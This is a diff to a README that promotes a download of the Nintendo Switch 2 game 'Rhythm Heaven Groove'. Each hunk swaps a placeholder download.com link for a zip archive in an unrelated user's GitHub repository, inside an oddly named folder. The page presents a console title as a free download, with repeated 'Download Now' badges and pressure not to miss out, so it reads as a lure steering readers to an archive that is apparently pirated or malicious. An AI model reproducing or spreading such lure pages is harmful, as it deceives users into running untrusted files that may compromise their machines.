@@ -4,7 +4,7 @@
 
 > The long-awaited return of Nintendo's beloved rhythm game series — quirky, perfectly tuned minigames that will have you tapping, flicking, and grinning uncontrollably.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/riyadhismael3-source/rhythm-heaven-groove/main/heteronymous/rhythm-groove-heaven-deep.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **Early July 2026** · Available on **Nintendo Switch 2**.
 
 ### Ready to play / use?
 
-[![Download Rhythm Heaven Groove](https://img.shields.io/badge/Download-Rhythm%20Heaven%20Groove-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Rhythm Heaven Groove](https://img.shields.io/badge/Download-Rhythm%20Heaven%20Groove-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/riyadhismael3-source/rhythm-heaven-groove/main/heteronymous/rhythm-groove-heaven-deep.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/riyadhismael3-source/rhythm-heaven-groove/main/heteronymous/rhythm-groove-heaven-deep.zip)**
 
 </div>
 
@@ -67,7 +67,7 @@ Rhythm Heaven Groove is one of the **most hyped releases of Summer 2026** — tr
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/riyadhismael3-source/rhythm-heaven-groove/main/heteronymous/rhythm-groove-heaven-deep.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -75,7 +75,7 @@ Rhythm Heaven Groove is one of the **most hyped releases of Summer 2026** — tr
 
 **Don't miss out — Rhythm Heaven Groove is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Rhythm%20Heaven%20Groove-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Rhythm%20Heaven%20Groove-blue?style=for-the-badge)](https://raw.githubusercontent.com/riyadhismael3-source/rhythm-heaven-groove/main/heteronymous/rhythm-groove-heaven-deep.zip)
 
 *Rhythm Heaven Groove — Early July 2026 · Nintendo Switch 2*
 
